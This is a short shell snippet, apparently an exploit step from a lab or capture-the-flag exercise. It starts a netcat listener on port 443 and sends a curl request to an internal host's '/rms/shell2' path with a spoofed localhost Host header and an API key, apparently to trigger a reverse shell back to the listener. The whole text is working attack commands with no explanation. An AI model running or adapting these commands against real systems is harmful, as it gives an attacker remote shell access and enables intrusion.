nc -lp 443 &
curl -s -X 'GET' "http://172.31.24.111/rms/shell2" \
 -H 'Host: 127.0.0.1:9080' \
 -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' \
 -H 'Accept: */*' \
 -H 'Accept-Encoding: utf8' \
 -H 'Connection: close' -o /dev/null & fg
